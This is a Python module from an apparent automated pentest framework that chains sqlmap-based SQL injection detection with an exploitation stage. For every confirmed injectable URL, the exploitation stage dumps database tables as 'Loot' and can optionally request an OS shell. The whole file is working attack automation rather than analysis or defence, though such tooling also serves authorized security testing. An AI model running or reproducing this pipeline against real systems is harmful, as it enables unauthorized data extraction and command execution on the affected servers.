"""SQL injection — detection (ACTIVE) and exploitation (OFFENSIVE).

Two stages that together form the flagship web-attack vertical:

  * ``sqli_detect``  (ACTIVE)    — sqlmap probes parameterized URLs harvested by
                                   the crawl stage and records each confirmed
                                   injectable parameter as a high-severity Finding.
  * ``sqli_exploit`` (OFFENSIVE) — for every confirmed injection point, sqlmap
                                   resumes its cached session and extracts data,
                                   recording what it pulled as Loot.

The exploit stage reuses the detect stage's sqlmap output directory so sqlmap
resumes from its saved session (no re-detection) and so all artifacts stay in
one place for the report.
"""

from __future__ import annotations

import re

from ..models import Finding, Loot, StageRun
from ..util import clean_host, dedupe
from .. import runner
from .base import Stage, StageContext

# sqlmap emits one "Parameter: <name> (<METHOD>)" block per injection point.
PARAM_RE = re.compile(r"^Parameter:\s*(.+?)\s*\((GET|POST|COOKIE|URI)\)", re.MULTILINE)
VULN_MARKERS = ("identified the following injection point",
                "is vulnerable", "the back-end DBMS is")
DUMPED_RE = re.compile(r"\[INFO\].*?dumped to (?:CSV file|file) '([^']+)'")


def _param_urls(ctx: StageContext) -> list[str]:
    """Harvested URLs that carry query parameters — sqlmap's candidate set."""
    urls = [u.url for u in ctx.results.crawl_urls if "?" in u.url and "=" in u.url]
    return dedupe(urls)


def _host_of(url: str) -> str | None:
    try:
        return clean_host(url) or None
    except Exception:  # noqa: BLE001
        return None


class SqliDetectStage(Stage):
    name = "sqli_detect"
    tools = ["sqlmap"]
    active = True                       # tier: active
    depends_on = ["crawl"]

    def execute(self, ctx: StageContext, record: StageRun) -> str:
        candidates = _param_urls(ctx)[: ctx.config.sqli_max_urls]
        if not candidates:
            return "no parameterized URLs to test"

        sdir = ctx.stage_dir(self.name)
        out_dir = sdir / "sqlmap"          # shared with sqli_exploit for session reuse
        found = 0
        for i, url in enumerate(candidates):
            cmd = [
                "sqlmap", "-u", url, "--batch", "--smart", "--disable-coloring",
                f"--level={ctx.config.sqlmap_level}",
                f"--risk={ctx.config.sqlmap_risk}",
                "--output-dir", str(out_dir),
            ]
            res = runner.run(cmd, timeout=ctx.config.timeout_for(self.name),
                             log_dir=sdir, log_name=f"sqlmap_detect_{i}")
            params = self._injectable_params(res.stdout)
            if not params:
                continue
            found += 1
            ctx.results.findings.append(Finding(
                template_id="sqli",
                name=f"SQL injection — parameter(s): {', '.join(params)}",
                severity="high",
                host=_host_of(url),
                matched_at=url,
                type="sqli",
                tags=["sqli", "injection"] + params,
                description="sqlmap confirmed one or more injectable parameters.",
            ))

        record.produced = found
        return f"{found}/{len(candidates)} URL(s) injectable"

    @staticmethod
    def _injectable_params(stdout: str) -> list[str]:
        if not stdout or not any(m in stdout for m in VULN_MARKERS):
            return []
        return dedupe(m.group(1) for m in PARAM_RE.finditer(stdout))


class SqliExploitStage(Stage):
    name = "sqli_exploit"
    tools = ["sqlmap"]
    tier = "offensive"                  # gated behind --exploit
    depends_on = ["sqli_detect"]

    def execute(self, ctx: StageContext, record: StageRun) -> str:
        targets = [f for f in ctx.results.findings if f.template_id == "sqli" and f.matched_at]
        if not targets:
            return "no confirmed SQLi to exploit"
        if not ctx.config.sqlmap_dump:
            return f"{len(targets)} injectable URL(s) — dump disabled in config"

        sdir = ctx.stage_dir(self.name)
        # Reuse the detect stage's session dir so sqlmap resumes, not re-detects.
        out_dir = ctx.run_dir / "sqli_detect" / "sqlmap"
        if not out_dir.exists():
            out_dir = sdir / "sqlmap"

        dumps = 0
        for i, f in enumerate(targets):
            cmd = [
                "sqlmap", "-u", f.matched_at, "--batch", "--disable-coloring",
                "--dump", "--exclude-sysdbs",
                "--output-dir", str(out_dir),
            ]
            if ctx.config.sqlmap_dump_max_rows:
                cmd += ["--stop", str(ctx.config.sqlmap_dump_max_rows)]
            if ctx.config.sqlmap_os_shell:
                cmd.append("--os-shell")   # opt-in: OS command execution
            res = runner.run(cmd, timeout=ctx.config.timeout_for(self.name),
                             log_dir=sdir, log_name=f"sqlmap_dump_{i}")

            files = DUMPED_RE.findall(res.stdout or "")
            if not files:
                continue
            dumps += 1
            ctx.results.loot.append(Loot(
                kind="db-dump",
                source=self.name,
                summary=f"{len(files)} table(s) dumped from {f.matched_at}",
                path=self._rel(ctx, out_dir),
            ))

        record.produced = dumps
        return f"data extracted from {dumps}/{len(targets)} injectable URL(s)"

    @staticmethod
    def _rel(ctx: StageContext, path) -> str:
        try:
            return str(path.relative_to(ctx.run_dir))
        except ValueError:
            return str(path)
